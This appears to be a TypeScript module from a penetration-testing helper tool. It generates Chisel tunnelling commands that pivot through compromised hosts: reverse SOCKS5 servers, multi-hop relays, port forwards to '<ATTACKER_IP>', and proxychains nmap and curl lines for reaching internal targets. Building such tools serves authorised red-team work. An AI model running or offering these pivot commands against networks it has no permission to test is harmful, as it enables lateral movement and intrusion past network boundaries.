import { ChiselPivot } from "@/app/hooks/useChiselPivot";
import { PivotCommands, CommandStep } from "@/app/types/tool";

function chiselBin(os: "linux" | "windows"): string {
  return os === "windows" ? "./chisel.exe" : "./chisel";
}

/**
 * Returns one PivotCommands section per hop:
 *   [0] Base hop (always present)
 *   [1..N] Relay hops (reverse-socks only, one per relay)
 *
 * Step numbers are globally sequential so the operator can read
 * "Step 1 → Step 2 → Step 3 → …" across all sections in order.
 */
export function resolvePivotCommands(pivot: ChiselPivot): PivotCommands[] {
  let step = 1;

  const serverIP = pivot.serverIP?.trim() ? pivot.serverIP : "<ATTACKER_IP>";
  const serverBin = chiselBin(pivot.serverOS);
  const clientBin = chiselBin(pivot.clientOS);

  function a(command: string): CommandStep {
    return { step: step++, command };
  }
  function t(command: string): CommandStep {
    return { step: step++, command };
  }

  /* ─── Reverse SOCKS5 ─────────────────────────────────────────── */
  if (pivot.mode === "reverse-socks") {
    const sections: PivotCommands[] = [];

    // Base section — step order mirrors the blog exactly:
    //   1. Attacker: start server
    //   2. Pivot 1: connect with R:socks
    //   3. Attacker: configure proxychains
    //   4. Attacker: usage example
    const base: PivotCommands = { attacker: [], target: [] };

    base.attacker.push(
      a(`${serverBin} server --port ${pivot.serverPort} --reverse --socks5`)
    );
    base.target.push(
      t(`${clientBin} client ${serverIP}:${pivot.serverPort} R:socks`)
    );
    base.attacker.push(
      a(
        `# /etc/proxychains.conf (hop 1):\n` +
        `#   socks5 127.0.0.1 ${pivot.socksPort}`
      )
    );
    base.attacker.push(
      a(
        `# proxychains nmap -sT -Pn <TARGET>\n` +
        `# proxychains curl http://<INTERNAL_TARGET>`
      )
    );

    sections.push(base);

    // Relay sections — one per additional hop
    for (let i = 0; i < pivot.relays.length; i++) {
      const relay = pivot.relays[i];

      // The relay pivot's OS: Pivot 1 = clientOS, Pivot 2+ = previous relay's relayOS
      const relayPivotOS =
        i === 0 ? pivot.clientOS : pivot.relays[i - 1].relayOS;
      const relayPivotBin = chiselBin(relayPivotOS);
      const newPivotBin = chiselBin(relay.relayOS);
      const relayIP = relay.pivotInternalIP?.trim()
        ? relay.pivotInternalIP
        : `<PIVOT${i + 1}_INTERNAL_IP>`;

      // Step order for relay section:
      //   N  : Relay pivot starts a second Chisel server
      //   N+1: New pivot connects to relay server with R:socks
      //   N+2: Relay pivot forwards that SOCKS back to attacker
      //   N+3: [Attacker] configure proxychains for this hop
      const section: PivotCommands = { attacker: [], target: [] };

      // "attacker" array = relay pivot commands (+ attacker config note)
      section.attacker.push(
        a(`${relayPivotBin} server --port ${relay.serverPort} --reverse --socks5`)
      );
      section.target.push(
        t(`${newPivotBin} client ${relayIP}:${relay.serverPort} R:socks`)
      );
      section.attacker.push(
        a(
          `${relayPivotBin} client ${serverIP}:${pivot.serverPort} ` +
          `R:${relay.socksPort}:127.0.0.1:1080`
        )
      );
      section.attacker.push(
        a(
          `# [Attacker] proxychains_hop${i + 2}.conf:\n` +
          `#   socks5 127.0.0.1 ${relay.socksPort}`
        )
      );

      sections.push(section);
    }

    return sections;
  }

  /* ─── Normal (Forward) Tunnel ────────────────────────────────── */
  // Server = pivot (has route to target), client = attacker.
  // The LISTENER opens on the CLIENT (attacker), not the server.
  if (pivot.mode === "normal-forward") {
    const section: PivotCommands = { attacker: [], target: [] };

    // "attacker" array = pivot/server commands
    // "target" array   = attacker/client commands
    section.attacker.push(
      a(`${serverBin} server --port ${pivot.serverPort}`)
    );

    if (pivot.forwards.length === 0) {
      section.target.push(
        t(
          `${clientBin} client ${serverIP}:${pivot.serverPort} ` +
          `<LPORT>:<TARGET_HOST>:<RPORT>`
        )
      );
    } else {
      for (const f of pivot.forwards) {
        const remoteHost = f.remoteHost?.trim() ? f.remoteHost : "<TARGET_HOST>";
        section.target.push(
          t(
            `${clientBin} client ${serverIP}:${pivot.serverPort} ` +
            `${f.localPort}:${remoteHost}:${f.remotePort}`
          )
        );
        // Port opens on the client (attacker) — access from the attacker machine
        section.target.push(
          t(`# Port ${f.localPort} opens here (attacker). Access: http://localhost:${f.localPort}`)
        );
      }
    }

    return [section];
  }

  /* ─── Reverse Forward (R: tunnel) ───────────────────────────── */
  // Server = attacker (--reverse), client = pivot.
  // The LISTENER opens on the SERVER (attacker) via the R: prefix.
  if (pivot.mode === "reverse-forward") {
    const section: PivotCommands = { attacker: [], target: [] };

    section.attacker.push(
      a(`${serverBin} server --port ${pivot.serverPort} --reverse`)
    );

    if (pivot.forwards.length === 0) {
      section.target.push(
        t(
          `${clientBin} client ${serverIP}:${pivot.serverPort} ` +
          `R:<LPORT>:<TARGET_HOST>:<RPORT>`
        )
      );
    } else {
      for (const f of pivot.forwards) {
        const remoteHost = f.remoteHost?.trim() ? f.remoteHost : "<TARGET_HOST>";
        section.target.push(
          t(
            `${clientBin} client ${serverIP}:${pivot.serverPort} ` +
            `R:${f.localPort}:${remoteHost}:${f.remotePort}`
          )
        );
        section.attacker.push(
          a(`# Port ${f.localPort} opens here (attacker). Access: http://localhost:${f.localPort}`)
        );
      }
    }

    return [section];
  }

  return [{ attacker: [], target: [] }];
}
